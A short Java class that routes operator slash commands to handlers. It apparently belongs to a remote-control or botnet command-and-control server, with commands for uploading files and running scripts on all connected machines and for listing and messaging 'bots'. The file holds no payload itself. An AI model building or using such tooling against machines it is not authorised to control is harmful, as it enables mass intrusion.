package netty.server;

import lombok.AllArgsConstructor;
import netty.server.commands.*;

import java.io.*;

@AllArgsConstructor
public class CommandExecutor implements Runnable {
    private String command;


    @Override
    public void run() {
        try {
            interpretCommand(command);
        } catch (IOException | InterruptedException e) {
            //e.printStackTrace();
        }
    }

    private void interpretCommand(String command) throws IOException, InterruptedException {
        if (command.length() >= 1) {
            if (command.charAt(0) != '/') {
                SendToCurrentConnection.run(command);
                return;
            }
        }

        command+=" ";
        if (command.contains("/sendToAll ")) {
            SendToAll.run(command);
        } else if (command.contains("/connections ")) {
            Connections.run(command);
        } else if (command.contains("/sendTo ")) {
            SendTo.run(command);
        } else if (command.contains("/showOutput ")) {
            ShowOutput.run(command);
        } else if (command.contains("/connect ")) {
            Connect.run(command);
        } else if (command.contains("/upload ")) {
            Upload.run(command);
        } else if (command.contains("/background ")) {
            Background.run(command);
        }else if(command.contains("/testConnections ")){
            TestConnections.run();
        } else if(command.contains("/tests ")){
            Tests.run(command);
        } else if (command.contains("/test ")) {
            Test.run(command);
        } else if (command.contains("/loadTools ")) {
            LoadTools.run(command);
        } else if (command.contains("/help ")) {
            Help.run(command);
        } else if (command.contains("/uploadToAll ")) {
            UploadToAll.run(command);
        } else if (command.contains("/clear ")) {
            Clear.run(command);
        } else if (command.contains("/exit ")) {
            Exit.run(command);
        }else if(command.contains("/executeScript ")){
            ExecuteScript.run(command);
        }else if(command.contains("/count ")){
            Count.run();
        }else if(command.contains("/bots ")){
            Bots.run();
        }else if(command.contains("/testBots ")){
            TestBots.run();
        }else if(command.contains("/sendToBots ")){
            SendToBots.run(command);
        }else if(command.contains("/cb ")){
            CountBots.run();
        }
    }
}
